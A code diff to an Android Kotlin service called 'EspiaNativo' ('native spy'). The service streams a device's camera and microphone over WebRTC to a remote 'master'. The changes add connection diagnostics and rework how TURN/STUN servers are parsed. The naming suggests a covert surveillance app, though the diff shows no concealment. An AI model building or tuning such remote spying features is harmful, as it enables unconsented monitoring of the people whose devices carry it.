@@ -84,6 +84,11 @@ class EspiaNativo : Service() {
     @Volatile private var cerrado = false
     @Volatile private var ofertaAplicada = false
     @Volatile private var remotoListo = false
+    // diagnóstico (se reporta al cerrar la sesión → detalle_fin, para ver por qué no junta candidatos)
+    @Volatile private var dgCand = 0
+    @Volatile private var dgLocal = "?"
+    @Volatile private var dgGath = "?"
+    @Volatile private var dgMedios = "?"
     private var iceDesde = 0L
     private val colaIceSalida = ConcurrentLinkedQueue<JSONObject>()   // nuestros candidatos hacia el master
     private val colaIceEntrante = ConcurrentLinkedQueue<IceCandidate>() // candidatos del master en espera de remoteDescription
@@ -179,8 +184,9 @@ class EspiaNativo : Service() {
             val streamIds = listOf("mg_stream")
             videoTrack?.let { peer.addTrack(it, streamIds) }
             peer.addTrack(at, streamIds)
+            dgMedios = "cam=" + (videoTrack != null) + ",aud=" + (audioTrack != null) + ",ice=" + iceServers.size
             return true
-        } catch (e: Throwable) { Log.e(TAG, "crearMedios", e); return false }
+        } catch (e: Throwable) { Log.e(TAG, "crearMedios", e); dgMedios = "excep:" + (e.message ?: ""); return false }
     }
 
     // ── señalización (idéntica al espía web) ──
@@ -204,13 +210,18 @@ class EspiaNativo : Service() {
                         flushIceEntrante()
                         pc?.createAnswer(object : SdpObs() {
                             override fun onCreateSuccess(desc: SessionDescription) {
-                                pc?.setLocalDescription(SdpObs(), desc)
+                                // setLocalDescription DEBE tener éxito para que ARRANQUE el ICE gathering
+                                pc?.setLocalDescription(object : SdpObs() {
+                                    override fun onSetSuccess() { dgLocal = "ok" }
+                                    override fun onSetFailure(error: String?) { dgLocal = "fail:" + (error ?: "") }
+                                }, desc)
                                 // la subida es red: fuera del hilo de señalización de WebRTC
                                 thread(isDaemon = true) {
                                     val ans = JSONObject().put("type", "answer").put("sdp", desc.description)
                                     rpc("espia_subir_respuesta", JSONObject().put("sesionId", sesion).put("sdp", ans.toString()))
                                 }
                             }
+                            override fun onCreateFailure(error: String?) { dgLocal = "answerFail:" + (error ?: "") }
                         }, MediaConstraints())
                     }
                     override fun onSetFailure(error: String?) { Log.w(TAG, "setRemote fail: $error"); ofertaAplicada = false }
@@ -246,6 +257,7 @@ class EspiaNativo : Service() {
     // ── observers WebRTC ──
     private inner class PcObs : PeerConnection.Observer {
         override fun onIceCandidate(c: IceCandidate) {
+            dgCand++
             try { colaIceSalida.add(JSONObject().put("candidate", c.sdp).put("sdpMid", c.sdpMid).put("sdpMLineIndex", c.sdpMLineIndex)) } catch (_: Throwable) {}
         }
         override fun onConnectionChange(state: PeerConnection.PeerConnectionState) {
@@ -274,7 +286,7 @@ class EspiaNativo : Service() {
         override fun onSignalingChange(state: PeerConnection.SignalingState?) {}
         override fun onIceConnectionChange(state: PeerConnection.IceConnectionState?) {}
         override fun onIceConnectionReceivingChange(receiving: Boolean) {}
-        override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) {}
+        override fun onIceGatheringChange(state: PeerConnection.IceGatheringState?) { dgGath = state?.name ?: "?" }
         override fun onAddStream(stream: MediaStream?) {}
         override fun onRemoveStream(stream: MediaStream?) {}
         override fun onAddTrack(receiver: RtpReceiver?, streams: Array<out MediaStream>?) {}
@@ -331,19 +343,16 @@ class EspiaNativo : Service() {
                 val s = arr.optJSONObject(i) ?: continue
                 val urls = ArrayList<String>()
                 val u = s.opt("urls")
-                if (u is JSONArray) for (k in 0 until u.length()) urls.add(u.optString(k)) else if (u is String) urls.add(u)
+                if (u is JSONArray) for (k in 0 until u.length()) { val x = u.optString(k).trim(); if (x.isNotEmpty()) urls.add(x) }
+                else if (u is String) { val x = u.trim(); if (x.isNotEmpty()) urls.add(x) }
+                if (urls.isEmpty()) continue
                 val user = s.optString("username", ""); val cred = s.optString("credential", "")
-                // [fix ICE] UN IceServer POR URL: si el nativo rechaza una url (ej. "?transport=tcp"), solo
-                // se pierde ESA, no todo el server TURN → el celular sí junta candidatos relay (antes 0-5).
-                for (url in urls) {
-                    val uu = url.trim(); if (uu.isEmpty()) continue
-                    try {
-                        val b = PeerConnection.IceServer.builder(uu)
-                        if (user.isNotBlank()) b.setUsername(user)
-                        if (cred.isNotBlank()) b.setPassword(cred)
-                        out.add(b.createIceServer())
-                    } catch (_: Throwable) {}
-                }
+                try {
+                    val b = PeerConnection.IceServer.builder(urls)   // estándar: un IceServer con sus urls (como el navegador)
+                    if (user.isNotBlank()) b.setUsername(user)
+                    if (cred.isNotBlank()) b.setPassword(cred)
+                    out.add(b.createIceServer())
+                } catch (_: Throwable) {}
             }
         } catch (_: Throwable) {}
         if (out.isEmpty()) out.add(PeerConnection.IceServer.builder("stun:stun.l.google.com:19302").createIceServer())
@@ -372,8 +381,10 @@ class EspiaNativo : Service() {
     private fun detener(motivo: String) {
         if (cerrado) return
         cerrado = true
-        Log.i(TAG, "cerrar: $motivo")
-        try { rpc("espia_cerrar_sesion", JSONObject().put("sesionId", sesion).put("lado", "device").put("motivo", motivo)) } catch (_: Throwable) {}
+        // diagnóstico embebido en el motivo → queda en detalle_fin de la sesión (para ver por qué no conecta)
+        val diag = "nat[medios=$dgMedios·local=$dgLocal·gath=$dgGath·cand=$dgCand] $motivo"
+        Log.i(TAG, "cerrar: $diag")
+        try { rpc("espia_cerrar_sesion", JSONObject().put("sesionId", sesion).put("lado", "device").put("motivo", diag)) } catch (_: Throwable) {}
         try { capturer?.stopCapture() } catch (_: Throwable) {}
         try { capturer?.dispose() } catch (_: Throwable) {}
         try { videoTrack?.dispose() } catch (_: Throwable) {}
